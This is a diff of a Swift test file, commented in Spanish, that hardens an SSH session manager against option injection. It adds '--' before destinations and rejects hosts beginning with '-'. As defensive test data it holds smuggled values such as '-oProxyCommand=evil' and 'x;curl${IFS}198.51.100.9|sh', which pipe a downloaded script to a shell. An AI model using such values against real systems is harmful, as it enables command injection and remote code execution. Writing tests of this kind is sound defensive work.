@@ -74,13 +74,13 @@ private let config = """
     @Test func rutaDeSesionUsaElAlias() throws {
         let r = try manager.route(to: #require(manager.profile(named: "core-01")))
         #expect(r.jumps == [Endpoint(user: "tu.usuario", host: "192.0.2.1")])
-        #expect(r.command.arguments == ["core-01"])
+        #expect(r.command.arguments == ["--", "core-01"])
     }
 
     @Test func accesoDirectoDeSaltoEscribeSshEnElSalto() throws {
         // sin -J: se abre el salto y en su prompt se escribe el ssh (vale aunque no deje reenviar puertos)
         let r = try manager.jumpShortcut(to: "admin@192.0.2.50:2222", via: "bastion")
-        #expect(r.command.arguments == ["bastion"])
+        #expect(r.command.arguments == ["--", "bastion"])
         #expect(r.thenCommand == "ssh -p 2222 admin@192.0.2.50")
         #expect(r.thenUser == "admin")
         #expect(r.title == "192.0.2.50 ⟵ bastion")
@@ -92,13 +92,13 @@ private let config = """
     @Test func sesionConProxyJumpEscritaEnElSalto() throws {
         let r = try manager.route(to: #require(manager.profile(named: "core-01")))
         let h = try #require(try manager.typedHop(for: r))
-        #expect(h.command.arguments == ["bastion"])
+        #expect(h.command.arguments == ["--", "bastion"])
         #expect(h.thenCommand == "ssh -p 2222 tu.usuario@192.0.2.11")
     }
 
     @Test func telnetATravesDelSalto() throws {
         let r = try manager.route(to: #require(manager.profile(named: "olt-01")))
-        #expect(r.command.arguments == ["-t", "tu.usuario@192.0.2.1", "telnet", "192.0.2.21"])
+        #expect(r.command.arguments == ["-t", "--", "tu.usuario@192.0.2.1", "telnet", "192.0.2.21"])
     }
 
     @Test func conectarSinGuardarVaExplicito() throws {
@@ -109,10 +109,10 @@ private let config = """
         s.jump = "bastion"
         let r = try manager.route(unsaved: s)
         #expect(r.alias == nil && r.sessionName == nil)
-        #expect(r.command.arguments == ["-J", "tu.usuario@192.0.2.1", "-p", "2200", "-l", "tu.usuario", "198.51.100.7"])
+        #expect(r.command.arguments == ["-J", "tu.usuario@192.0.2.1", "-p", "2200", "-l", "tu.usuario", "--", "198.51.100.7"])
         // (sin salto: ssh directo; y nada que empiece por «-» llega como opción)
         s.jump = ""
-        #expect(try manager.route(unsaved: s).command.arguments == ["-p", "2200", "-l", "tu.usuario", "198.51.100.7"])
+        #expect(try manager.route(unsaved: s).command.arguments == ["-p", "2200", "-l", "tu.usuario", "--", "198.51.100.7"])
         s.host = "-oProxyCommand=evil"
         #expect(throws: RouteError.self) { try manager.route(unsaved: s) }
         // (telnet con salto: el equipo se escribe en la shell del salto)
@@ -120,6 +120,29 @@ private let config = """
         s.jump = "bastion"
         s.host = "x;curl${IFS}198.51.100.9|sh"
         #expect(throws: RouteError.self) { try manager.route(unsaved: s) }
+    }
+
+    @Test func nadaEmpiezaPorGuionTrasLaArroba() {
+        // («x@-oProxyCommand=…» era host «-oProxyCommand=…»: ssh lo leía como opción)
+        for t in ["x@-oProxyCommand=evil", "-x@192.0.2.1", "x@-D1080", "-oProxyCommand=evil"] {
+            #expect(Endpoint(parsing: t) == nil, "\(t)")
+        }
+        #expect(Endpoint(parsing: "tu.usuario@192.0.2.1:2222") == Endpoint(user: "tu.usuario", host: "192.0.2.1", port: 2222))
+        // (y un salto a mano que lo intente, tampoco)
+        let m = SessionManager(profiles: [SessionProfile(name: "x", hostName: "192.0.2.1", proxyJump: ["a@-oProxyCommand=evil"])])
+        #expect(throws: RouteError.self) { try m.route(to: m.profile(named: "x")!) }
+        #expect(throws: RouteError.self) { try m.jumpRoute("a@-oProxyCommand=evil") }
+    }
+
+    @Test func dobleGuionAntesDelDestino() throws {
+        // (aunque algo empezara por «-», tras «--» ssh y sftp lo leen como destino)
+        var r = ConnectionRoute(title: "x", target: Endpoint(user: "tu.usuario", host: "192.0.2.5", port: 2222))
+        #expect(r.command.arguments == ["-p", "2222", "-l", "tu.usuario", "--", "192.0.2.5"])
+        r.transport = .sftp
+        #expect(r.command.arguments == ["-P", "2222", "--", "tu.usuario@192.0.2.5"])
+        #expect(r.sftpSubsystemCommand?.arguments.suffix(3) == ["--", "192.0.2.5", "sftp"])
+        // (el usuario de la orden se sigue leyendo bien con «--»)
+        #expect(CommandLineUser.parse("$ ssh -p 2222 -l admin -- 192.0.2.5") == Endpoint(user: "admin", host: "192.0.2.5", port: 2222))
     }
 
     @Test func bucleDeSaltos() {
